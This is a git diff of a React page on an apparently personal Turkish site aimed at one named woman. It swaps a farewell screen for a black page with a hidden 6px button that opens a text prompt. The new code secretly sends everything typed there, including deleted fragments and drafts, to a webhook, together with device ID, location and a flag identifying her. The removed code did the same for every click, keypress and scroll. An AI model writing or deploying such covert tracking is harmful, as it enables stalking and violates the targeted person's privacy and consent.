@@ -1,12 +1,13 @@
-import React, { useEffect, useRef, useCallback } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { postLogToApi } from '../utils/gardenEngine';
 
 /**
  * LastLetterPage Component (/last)
- * Clean, Permanent Final Farewell Message Screen
- * - Immediately sends webhook notification on page land (0th second).
- * - Displays the final message card directly without burn animations or timers.
- * - Zero matchboxes, zero paper folding, zero darkness overlays.
+ * Pure Stealth Dark Mode Screen
+ * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
+ * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
+ * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
+ * - Yazılan, silinen ve gönderilen her şey anlık bildirim olarak gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -21,7 +22,18 @@ export default function LastLetterPage({ onGoHome }) {
 
   // Analytics & Timing
   const sessionStartTimeRef = useRef(Date.now());
-  const currentStageRef = useRef('Final Mektubu Ekranı');
+  const currentStageRef = useRef('Gizli Siyah Ekran');
+
+  // Interactive Secret State
+  const [isSecretOpen, setIsSecretOpen] = useState(false);
+  const [inputText, setInputText] = useState('');
+  const [isSubmitted, setIsSubmitted] = useState(false);
+
+  // Real-time Text Tracking Refs
+  const allTypedHistoryRef = useRef('');
+  const deletedTextHistoryRef = useRef('');
+  const prevTextRef = useRef('');
+  const debounceTimerRef = useRef(null);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -85,7 +97,7 @@ export default function LastLetterPage({ onGoHome }) {
         location: geoData ? `${geoData.city}, ${geoData.country}` : null,
         action: isAysenur
           ? '🌹 AYŞENUR SİTEYE GİRİŞ YAPTI! (dev_uu756pefo_msyyhe2u)'
-          : 'Ziyaretçi /last Sayfasına Giriş Yaptı'
+          : 'Ziyaretçi Siyah Ekran Sayfasına Giriş Yaptı'
       });
     };
 
@@ -119,7 +131,10 @@ export default function LastLetterPage({ onGoHome }) {
         data: {
           action: 'Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
           duration: durationStr,
-          stage: 'Final Mektubu Ekranı',
+          stage: currentStageRef.current,
+          letterText: prevTextRef.current || null,
+          allTypedHistory: allTypedHistoryRef.current || null,
+          deletedText: deletedTextHistoryRef.current || null,
           deviceId: deviceId,
           device: detectDevice(),
           is_aysenur: true
@@ -139,200 +154,242 @@ export default function LastLetterPage({ onGoHome }) {
     return () => window.removeEventListener('beforeunload', handleLeavePage);
   }, [deviceId, detectDevice]);
 
-  // Global Click, Keypress & Scroll Interaction Engine
-  const lastClickTimeRef = useRef(0);
-  const lastScrollTimeRef = useRef(0);
+  // Handle Secret Button Click
+  const handleSecretButtonClick = () => {
+    setIsSecretOpen(true);
+    currentStageRef.current = 'Gizli Soru Kutusu Açıldı';
+    sendLog('secret_button_clicked', {
+      action: 'Ziyaretçi Sağ Alttaki Nokta Butonuna Tıkladı & Soru Açıldı'
+    });
+  };
 
-  useEffect(() => {
-    // 1. Global Click Listener (Left Click & Context Menu Right Click)
-    const handleClick = (e) => {
-      const now = Date.now();
-      if (now - lastClickTimeRef.current < 600) return; // Debounce rapid clicks
-      lastClickTimeRef.current = now;
+  // Handle Input Text Change (Capture typing, additions, deletions live)
+  const handleInputChange = (e) => {
+    const newVal = e.target.value;
+    const oldVal = prevTextRef.current;
+    setInputText(newVal);
 
-      const clickType = e.type === 'contextmenu' ? 'Sağ Tıklama (Context Menu)' : 'Sol Tıklama';
-      const targetElement = e.target ? (e.target.tagName + (e.target.className ? `.${String(e.target.className).slice(0, 30)}` : '')) : 'Ekranda Rastgele Yer';
-      const coords = `X: ${e.clientX || 0}px, Y: ${e.clientY || 0}px`;
+    // 1. Accumulate all typed characters over time
+    if (newVal.length > oldVal.length) {
+      const added = newVal.slice(oldVal.length);
+      allTypedHistoryRef.current += added;
+    } else if (newVal.length < oldVal.length) {
+      // 2. Track deleted text snippets
+      const deletedSegment = oldVal.slice(newVal.length);
+      if (deletedSegment) {
+        deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
+      }
+    }
 
-      sendLog('last_user_click', {
-        clickType,
-        targetElement,
-        coordinates: coords,
-        action: `Ziyaretçi Ekrana Tıkladı (${clickType} - ${coords})`
+    prevTextRef.current = newVal;
+
+    // 3. Debounced Live Webhook Logging (500ms after last stroke)
+    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
+    debounceTimerRef.current = setTimeout(() => {
+      sendLog('secret_input_typed', {
+        letterText: newVal,
+        answer: newVal,
+        answerInput: newVal,
+        allTypedHistory: allTypedHistoryRef.current || newVal,
+        deletedText: deletedTextHistoryRef.current || null,
+        draftLength: newVal.length,
+        action: `Ziyaretçi Gizli Kutuya Yazıyor: "${newVal}"`
       });
-    };
+    }, 500);
+  };
 
-    // 2. Global Keypress Listener
-    const handleKeyDown = (e) => {
-      if (!e.key) return;
-      sendLog('last_user_keypress', {
-        key: e.key,
-        pressed_key: e.key,
-        action: `Ziyaretçi Klavyede Tuşa Bastı ("${e.key}")`
-      });
-    };
+  // Handle Form Submission
+  const handleSubmit = (e) => {
+    if (e) e.preventDefault();
+    if (!inputText.trim()) return;
 
-    // 3. Global Scroll Gesture Listener
-    const handleScroll = () => {
-      const now = Date.now();
-      if (now - lastScrollTimeRef.current < 2500) return; // Debounce scroll notifications (2.5s)
-      lastScrollTimeRef.current = now;
+    if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
 
-      const scrollTop = window.scrollY || document.documentElement.scrollTop || 0;
-      const scrollHeight = (document.documentElement.scrollHeight || 1) - (window.innerHeight || 1);
-      const scrollPct = Math.round(Math.min(100, Math.max(0, (scrollTop / (scrollHeight || 1)) * 100)));
+    sendLog('secret_input_submitted', {
+      letterText: inputText,
+      answer: inputText,
+      answerInput: inputText,
+      allTypedHistory: allTypedHistoryRef.current || inputText,
+      deletedText: deletedTextHistoryRef.current || null,
+      draftLength: inputText.length,
+      action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
+    });
 
-      sendLog('last_scroll_started', {
-        scrollPercentage: `${scrollPct}%`,
-        scrollStatus: `Ziyaretçi Sayfayı Kaydırdı (%${scrollPct})`,
-        action: `Ziyaretçi Sayfayı Kaydırdı (%${scrollPct})`
-      });
-    };
-
-    window.addEventListener('click', handleClick);
-    window.addEventListener('contextmenu', handleClick);
-    window.addEventListener('keydown', handleKeyDown);
-    window.addEventListener('scroll', handleScroll, { passive: true });
-    window.addEventListener('wheel', handleScroll, { passive: true });
-
-    return () => {
-      window.removeEventListener('click', handleClick);
-      window.removeEventListener('contextmenu', handleClick);
-      window.removeEventListener('keydown', handleKeyDown);
-      window.removeEventListener('scroll', handleScroll);
-      window.removeEventListener('wheel', handleScroll);
-    };
-  }, [sendLog]);
+    setIsSubmitted(true);
+    setTimeout(() => {
+      setIsSubmitted(false);
+    }, 4000);
+  };
 
   return (
     <div
       style={{
-        position: 'relative',
+        position: 'fixed',
+        inset: 0,
         width: '100vw',
-        minHeight: '100vh',
-        backgroundColor: '#09090b',
+        height: '100vh',
+        backgroundColor: '#000000',
         color: '#f8fafc',
         display: 'flex',
         flexDirection: 'column',
         alignItems: 'center',
         justifyContent: 'center',
-        padding: '32px 24px',
-        textAlign: 'center',
-        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
-        overflowX: 'hidden'
+        padding: '24px',
+        margin: 0,
+        overflow: 'hidden',
+        userSelect: 'none',
+        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
       }}
     >
-      {/* Background Subtle Gradient Glow */}
-      <div
+      {/* 1. SECRET TINY DOT BUTTON (Bottom Right - 6px Diameter, 1 Shade Lighter than Pitch Black #000) */}
+      <button
+        onClick={handleSecretButtonClick}
+        aria-label="Secret trigger"
         style={{
-          position: 'absolute',
-          top: '50%',
-          left: '50%',
-          transform: 'translate(-50%, -50%)',
-          width: '600px',
-          height: '600px',
-          background: 'radial-gradient(circle, rgba(239, 68, 68, 0.08) 0%, rgba(0, 0, 0, 0) 70%)',
-          pointerEvents: 'none',
-          zIndex: 0
+          position: 'fixed',
+          bottom: '12px',
+          right: '12px',
+          width: '6px',
+          height: '6px',
+          borderRadius: '50%',
+          backgroundColor: '#18181b',
+          border: 'none',
+          outline: 'none',
+          cursor: 'pointer',
+          padding: 0,
+          margin: 0,
+          zIndex: 9999,
+          transition: 'background-color 0.3s ease, transform 0.2s ease'
+        }}
+        onMouseEnter={(e) => {
+          e.currentTarget.style.backgroundColor = '#27272a';
+          e.currentTarget.style.transform = 'scale(1.3)';
+        }}
+        onMouseLeave={(e) => {
+          e.currentTarget.style.backgroundColor = '#18181b';
+          e.currentTarget.style.transform = 'scale(1)';
         }}
       />
 
-      {/* Main Content Box */}
-      <div
-        style={{
-          position: 'relative',
-          maxWidth: 680,
-          width: '100%',
-          display: 'flex',
-          flexDirection: 'column',
-          alignItems: 'center',
-          zIndex: 1
-        }}
-      >
-        {/* Farewell Title */}
-        <h2
-          style={{
-            fontFamily: "'Cardo', Georgia, serif",
-            fontSize: 'clamp(1.7rem, 4vw, 2.5rem)',
-            fontWeight: 400,
-            color: '#f3f4f6',
-            lineHeight: 1.6,
-            marginBottom: 20,
-            letterSpacing: '0.02em'
-          }}
-        >
-          Hayatımdan gelip geçtiğin için çok teşekkürler..
-        </h2>
-
-        {/* Subtitle */}
-        <p
-          style={{
-            fontFamily: "'Cardo', Georgia, serif",
-            fontSize: 'clamp(1.15rem, 2.6vw, 1.45rem)',
-            fontWeight: 400,
-            fontStyle: 'italic',
-            color: '#cbd5e1',
-            lineHeight: 1.7,
-            marginBottom: 28,
-            opacity: 0.9
-          }}
-        >
-          Sana dair her şeyim silinecek, ancak seni asla unutmayacağım.
-        </p>
-
-        {/* Farewell Highlight */}
-        <h3
-          style={{
-            fontFamily: "'Cardo', Georgia, serif",
-            fontSize: 'clamp(2.2rem, 5vw, 3.2rem)',
-            fontWeight: 400,
-            color: '#ef4444',
-            letterSpacing: '0.06em',
-            margin: '0 0 36px 0',
-            textShadow: '0 0 25px rgba(239, 68, 68, 0.4)'
-          }}
-        >
-          Elveda
-        </h3>
-
-        {/* System Deletion Summary Lines */}
+      {/* 2. REVEALED QUESTION & INPUT FORM (Visible after clicking the tiny secret dot) */}
+      {isSecretOpen && (
         <div
           style={{
-            maxWidth: 620,
+            maxWidth: 580,
             width: '100%',
-            background: 'rgba(10, 11, 15, 0.85)',
-            border: '1px solid rgba(255, 255, 255, 0.08)',
-            borderRadius: 14,
-            padding: '24px 28px',
-            textAlign: 'left',
-            fontFamily: "'Courier New', Courier, monospace",
-            fontSize: 'clamp(0.82rem, 1.8vw, 0.95rem)',
-            color: '#94a3b8',
-            lineHeight: 1.9,
-            boxShadow: '0 15px 40px rgba(0,0,0,0.85)',
-            backdropFilter: 'blur(12px)'
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            textAlign: 'center',
+            animation: 'fadeIn 0.6s ease-out forwards',
+            zIndex: 10
           }}
         >
-          <div style={{ color: '#ef4444', marginBottom: 8, fontWeight: 'bold' }}>
-            ✓ Tüm galeri öğeleri silindi..
-          </div>
-          <div style={{ color: '#ef4444', marginBottom: 8, fontWeight: 'bold' }}>
-            ✓ Tüm mesajlaşmalar silindi..
-          </div>
-          <div style={{ color: '#ef4444', marginBottom: 8, fontWeight: 'bold' }}>
-            ✓ Görüşme kayıtları silindi..
-          </div>
-          <div style={{ color: '#ef4444', marginBottom: 8, fontWeight: 'bold' }}>
-            ✓ Numaralar silindi..
-          </div>
-          <div style={{ color: '#f59e0b', marginBottom: 12, wordBreak: 'break-all', lineHeight: 1.6 }}>
-            ✓ b**********n@gmail.com ve l***********d@gmail.com adresinde tüm "Ayşenur" işaretli ürünler silindi..
-          </div>
-          <div style={{ color: '#6ee7b7', borderTop: '1px solid rgba(255,255,255,0.1)', paddingTop: 12, fontStyle: 'italic' }}>
-            ⚡ Sitenin silinmesi için Cloudflare Worker üzerinden komut gönderildi.
-          </div>
+          {/* Question Title */}
+          <h2
+            style={{
+              fontFamily: "'Cardo', Georgia, serif",
+              fontSize: 'clamp(1.25rem, 3.5vw, 1.85rem)',
+              fontWeight: 400,
+              color: '#e4e7ec',
+              lineHeight: 1.55,
+              marginBottom: 28,
+              letterSpacing: '0.015em',
+              textShadow: '0 0 20px rgba(255, 255, 255, 0.15)'
+            }}
+          >
+            Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?
+          </h2>
+
+          {/* Text Area Form */}
+          <form
+            onSubmit={handleSubmit}
+            style={{
+              width: '100%',
+              display: 'flex',
+              flexDirection: 'column',
+              alignItems: 'center'
+            }}
+          >
+            <textarea
+              value={inputText}
+              onChange={handleInputChange}
+              onKeyDown={(e) => {
+                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                  handleSubmit(e);
+                }
+              }}
+              placeholder="Yazmak istediğin şey..."
+              autoFocus
+              rows={4}
+              style={{
+                width: '100%',
+                maxWidth: 520,
+                backgroundColor: 'rgba(18, 18, 22, 0.85)',
+                color: '#f4f4f5',
+                border: '1px solid rgba(255, 255, 255, 0.14)',
+                borderRadius: '14px',
+                padding: '16px 20px',
+                fontSize: '1.05rem',
+                fontFamily: "'Cardo', Georgia, serif",
+                lineHeight: 1.6,
+                outline: 'none',
+                resize: 'none',
+                boxShadow: '0 10px 30px rgba(0, 0, 0, 0.8), inset 0 2px 4px rgba(0, 0, 0, 0.5)',
+                transition: 'border-color 0.3s ease, box-shadow 0.3s ease'
+              }}
+            />
+
+            <div
+              style={{
+                marginTop: 20,
+                display: 'flex',
+                alignItems: 'center',
+                gap: 12
+              }}
+            >
+              <button
+                type="submit"
+                disabled={!inputText.trim()}
+                style={{
+                  backgroundColor: inputText.trim() ? '#27272a' : '#141416',
+                  color: inputText.trim() ? '#f4f4f5' : '#52525b',
+                  border: '1px solid rgba(255, 255, 255, 0.1)',
+                  borderRadius: '9999px',
+                  padding: '10px 28px',
+                  fontSize: '0.95rem',
+                  fontFamily: "'Cardo', Georgia, serif",
+                  cursor: inputText.trim() ? 'pointer' : 'default',
+                  transition: 'all 0.25s ease'
+                }}
+              >
+                Gönder
+              </button>
+
+              {isSubmitted && (
+                <span
+                  style={{
+                    color: '#34d399',
+                    fontSize: '0.9rem',
+                    fontStyle: 'italic',
+                    animation: 'fadeIn 0.3s ease forwards'
+                  }}
+                >
+                  ✓ Gönderildi
+                </span>
+              )}
+            </div>
+          </form>
         </div>
-      </div>
+      )}
+
+      {/* Global CSS for Animations */}
+      <style>{`
+        @keyframes fadeIn {
+          from { opacity: 0; transform: scale(0.98); }
+          to { opacity: 1; transform: scale(1); }
+        }
+      `}</style>
     </div>
   );
 }
